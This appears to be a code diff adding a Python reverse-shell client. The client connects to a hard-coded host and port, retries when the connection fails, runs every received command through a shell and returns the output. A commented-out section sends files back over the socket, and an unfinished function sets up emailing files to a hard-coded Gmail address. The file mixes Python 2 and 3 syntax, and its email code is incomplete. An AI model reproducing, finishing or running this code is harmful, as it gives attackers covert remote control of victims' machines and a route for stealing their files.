@@ -1,0 +1,132 @@
+import os
+import socket
+import subprocess
+import time
+import sys
+import smtplib
+from email import encoders
+from email import *
+import datetime
+
+
+def socket_create():
+    """
+    The function creates socket (allows two computers to connect)
+
+
+    :return: None
+    """
+    try:
+        global host
+        global port
+        global s
+        host = '10.0.0.19'
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print('Socket creation error: ' + str(msg))
+
+
+def socket_connect():
+    """
+    The function connects to a remote socket
+
+
+    :return: None
+    """
+    try:
+        global host
+        global port
+        global s
+        # print('Binding socket to port: ' + str(port))
+        s.connect((host, port))
+    except socket.error as msg:
+        print('Socket connection error: ' + str(msg))
+        time.sleep(5)
+        socket_connect()
+
+
+def receive_commands():
+    """
+    The function receives commands from the socket
+
+    :return: None
+    """
+    while True:
+        data = s.recv(20480)
+        if data[:2].decode("utf-8") == 'cd':
+            try:
+                os.chdir(data[3:].decode("utf-8"))
+            except:
+                pass
+        if data[:].decode("utf-8") == 'quit':
+            s.close()
+            break
+        # File transfer
+        """
+        if data[:8].decode("utf-8") == 'transfer':
+            file_path = str(os.getcwd()) + chr(92) + data[9:].decode("utf-8")
+            if not os.path.exists(file_path):
+                output_str = "The file does not exist" + "\n"
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print(output_str)
+            else:
+                try:
+                    file = open(str(file_path), "rb")
+                    l = file.read(1024)
+                    while (l):
+                        s.send(l)
+                        l = file.read(1024)
+                    
+                    output_str = "The file was transfer" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+                    
+                except:
+                    output_str = "Could not transfer the file" + "\n"
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
+
+        """
+        # The rest of commands
+        if len(data) > 0:
+            try:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+                                       stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes)
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print output_str
+            except:
+                output_str = "Command not recognized" + "\n"
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print(output_str)
+    s.close()
+
+def email_file(file_path):
+    from_address = "ovedimperia@gmail.com"
+    to_address = "ovedimperia@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = from_address
+    msg['To'] = to_address
+    msg['Subject'] = "File_Transfer From: {} At {}".format()
+
+def main():
+    global s
+    try:
+        socket_create()
+        socket_connect()
+        receive_commands()
+    except:
+        print("Error in main")
+        time.sleep(5)
+    s.close()
+    main()
+
+
+if __name__ == '__main__':
+    main()
